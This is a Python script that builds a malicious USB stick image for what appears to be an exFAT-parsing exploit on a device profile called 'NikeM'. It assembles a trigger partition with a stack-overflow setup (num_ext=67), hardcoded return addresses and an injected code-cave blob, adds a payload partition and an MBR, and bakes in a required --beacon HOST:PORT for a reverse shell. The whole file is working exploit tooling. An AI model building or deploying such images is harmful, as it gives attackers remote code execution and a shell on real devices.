#!/usr/bin/env python3
"""Build the NikeM (T-NKMAKUC) USB stick from the vendored Luminger tools.

Mirrors cfloinc's documented recipe (USB-EXPLOIT.md 6.1): MBR and p1 written
directly, p2 via mformat/mcopy, num_ext frozen at 67. The Mac must never
mount the finished image (fsKit defuses the trigger).
"""
import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
NUM_EXT = 67
TRIG_MB = 8
PAY_MB = 64
P1_LBA = 2048          # 1 MiB
P2_LBA = P1_LBA + TRIG_MB * 2048   # 9 MiB


def run(cmd):
    print(f"  $ {' '.join(str(c) for c in cmd)}")
    subprocess.run([str(c) for c in cmd], check=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--profile", choices=("nikem", "nikem-uep", "nikem-uep2"),
                    default="nikem")
    ap.add_argument("--beacon", required=True, help="HOST:PORT for the reverse shell")
    ap.add_argument("--out", default="out/nikem-usb.img")
    ap.add_argument("--payload-dir", default="payload/p2",
                    help="directory whose files become the p2 payload")
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()
    out = Path(args.out)
    if out.exists() and not args.force:
        sys.exit(f"{out} exists; pass --force")
    out.parent.mkdir(parents=True, exist_ok=True)

    work = Path(tempfile.mkdtemp(prefix="nikem-"))
    print("[+] kernel stage")
    stage = work / "stage.bin"
    run([sys.executable, "tools/build_kernel_stage.py", "--profile", args.profile,
         "--beacon", args.beacon, "--out", stage])

    print("[+] cave blob")
    cave = work / "cave.bin"
    # Chain constants are shared by every nikem* stage profile.
    run([sys.executable, "tools/build_cave_blob.py", "--profile", "nikem",
         "--payload", stage, "--out", cave])
    size = cave.stat().st_size
    # num_ext=67 copies 66*30 = 1980 bytes into the stack window; the blob is
    # injected at payload offset 1420, so it must end before 1980.
    print(f"[+] cave blob: {size} bytes (num_ext={NUM_EXT} stable requires <= 560)")
    if size > 560:
        sys.exit("cave blob too large for num_ext=67; trim the stage command")

    print("[+] p1 trigger (num_ext=67, frozen)")
    p1 = work / "p1.img"
    run([sys.executable, "tools/mk_trigger.py", p1, "--size-mb", str(TRIG_MB),
         "--num-ext", str(NUM_EXT),
         "--put", "528:c00083d8", "--put", "548:c0008428",
         "--put", "552:c0008e00", "--put", "556:c05455bc",
         "--inject-allow-zero", f"1420:{cave}"])

    print("[+] p2 payload (FAT16 via mformat)")
    p2 = work / "p2.img"
    with open(p2, "wb") as f:
        f.truncate(PAY_MB * 2**20)
    run(["mformat", "-i", p2, "-F", "-h", "64", "-s", "32", "-t", "2048",
         "-c", "1", "::"])
    payload_dir = Path(args.payload_dir)
    if not payload_dir.is_dir():
        sys.exit(f"--payload-dir {payload_dir} missing")
    for f in sorted(payload_dir.iterdir()):
        if f.is_file():
            run(["mcopy", "-i", p2, "-n", str(f), f"::{f.name}"])
    run(["mdir", "-i", p2, "-/"])

    print("[+] assembling image")
    total_mb = 4 + TRIG_MB + PAY_MB
    with open(out, "wb") as f:
        f.truncate(total_mb * 2**20)
    with open(out, "r+b") as f:
        f.seek(P1_LBA * 512)
        f.write(p1.read_bytes())
        f.seek(P2_LBA * 512)
        f.write(p2.read_bytes())
        # MBR: p1 (07, bootable) + p2 (0E), sig 0x55AA
        f.seek(0x1BE)
        f.write(struct.pack("<B", 0x80))
        f.write(struct.pack("<BBB", 0x20, 0x21, 0x00))  # CHS start (LBA 2048)
        f.write(struct.pack("<B", 0x07))
        f.write(struct.pack("<BBB", 0xFE, 0xFF, 0xFF))
        f.write(struct.pack("<I", P1_LBA))
        f.write(struct.pack("<I", TRIG_MB * 2048))
        f.seek(0x1CE)
        f.write(struct.pack("<B", 0x00))
        f.write(struct.pack("<BBB", 0xFE, 0xFF, 0xFF))
        f.write(struct.pack("<B", 0x0E))
        f.write(struct.pack("<BBB", 0xFE, 0xFF, 0xFF))
        f.write(struct.pack("<I", P2_LBA))
        f.write(struct.pack("<I", PAY_MB * 2048))
        f.seek(0x1FE)
        f.write(struct.pack("<H", 0xAA55))
    print(f"[+] wrote {out}")
    print("[+] simloop verification")
    run([sys.executable, "research/lab-lanes/exfat/r2/simloop.py", out, "--slot", "6"])


if __name__ == "__main__":
    main()
